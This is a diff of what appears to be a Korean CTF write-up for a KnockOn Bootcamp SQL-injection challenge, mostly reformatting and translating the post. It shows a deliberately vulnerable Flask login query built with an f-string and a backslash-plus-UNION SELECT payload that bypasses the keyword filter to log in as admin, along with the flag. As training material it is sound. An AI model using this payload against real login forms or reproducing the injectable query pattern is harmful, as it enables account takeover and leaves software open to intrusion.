@@ -1,55 +1,34 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 3.2 SQLi_WAF_2"
+title: "KnockOn Bootcamp 2nd - 3.2 SQLi WAF 2"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
+  - KnockOn Bootcamp 2nd
   - SQL Injection
   - Filter Bypass
-last_modified_at: 2024-08-28T23:00:00-05:00
+last_modified_at: 2024-08-29T13:00:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10031/>
 
-![3.2 SQLi WAF 2 1](/assets/images/writeup/web-hacking/knock-on/3-2_SQLi_WAF_2_1.png)
+![3.2 SQLi WAF 2 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-2-sqli-waf-2-1.png)
 
-![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)
+![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-2-sqli-waf-2-1.png)
 
-![3.2 SQLi WAF 2 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)
-
-|
-
-|
-
-|
+![3.2 SQLi WAF 2 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-2-sqli-waf-2-2.png)
 
 ### 목표
 
----
-
 필터링 로직을 우회하여 admin 계정으로 로그인하기
 
-|
-
 ### 공격 기법
-
----
 
 SQL Injection
 
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -74,17 +53,14 @@ app.config["SQLALCHEMY_DATABASE_URI"] = (
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 db = SQLAlchemy(app)
 
-
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password = db.Column(db.String(80), nullable=False)
 
-
 @app.route("/")
 def home():
     return render_template("index.html")
-
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -100,7 +76,7 @@ def login():
                 return render_template("login.html", error='no Hack!')
 
         query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
-        
+
         with db.engine.connect() as connection:
             result = connection.execute(query)
             user = result.fetchone()
@@ -114,24 +90,16 @@ def login():
     else :
         return render_template("login.html")
 
-
 @app.route("/success")
 def success():
     username = request.args.get("username", "Unknown")
     flag = request.args.get("flag", "So.. what?")
     return render_template("success.html", username=username, flag=flag)
 
-
 if __name__ == "__main__":
     db.create_all()
     app.run(debug=True, host="0.0.0.0", port=8080)
 ```
-
-|
-
-|
-
-|
 
 ## 코드 분석
 
@@ -143,14 +111,7 @@ password = request.form["password"].lower()
 
 or, and에 이어 `‘(따옴표)`가 금지 당함
 
-
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```sql
 SELECT * FROM user WHERE username = '{username}' AND password = '{password}'
@@ -164,8 +125,6 @@ admin' -- 1
 
 `‘`를 사용할 수 없기 때문에 기존의 공격 방식을 사용할 수 없음
 
-|
-
 ```sql
 SELECT * FROM user WHERE username = '\' AND password = '{password}'
 ```
@@ -174,19 +133,15 @@ SELECT * FROM user WHERE username = '\' AND password = '{password}'
 
 그래서 그 다음 `‘`까지, `'\' AND password ='` 가 문자열로 인식되고, 그 뒷부분인 `password` 부터 쿼리로 인식함
 
-`password`부분에  **union**을 이용해 **admin**으로 로그인하는 새 쿼리를 작성해주면 됨 
-
-|
+`password`부분에  **union**을 이용해 **admin**으로 로그인하는 새 쿼리를 작성해주면 됨
 
 ```sql
 union select 1,2,3 -- 1
 ```
 
-![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/3-2_SQLi_WAF_2_2.png)
+![3.2 SQLi WAF 2 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-3-2-sqli-waf-2-2.png)
 
 `user 테이블`의 열 수가 3이므로 기본 형태는 이렇게 됨
-
-|
 
 ```sql
 union select 1,(select username from user limit 1,1),3 -- 1
@@ -194,13 +149,7 @@ union select 1,(select username from user limit 1,1),3 -- 1
 
 `username`의 첫 번째 행은 guest이므로 두 번째 행인 **admin**으로 설정
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```
 username: \
@@ -208,18 +157,8 @@ username: \
 password: union select 1, (select username from user limit 1,1), 3 -- 1
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```
 K0{quote_is_important}
 ```
-
-|
-
----
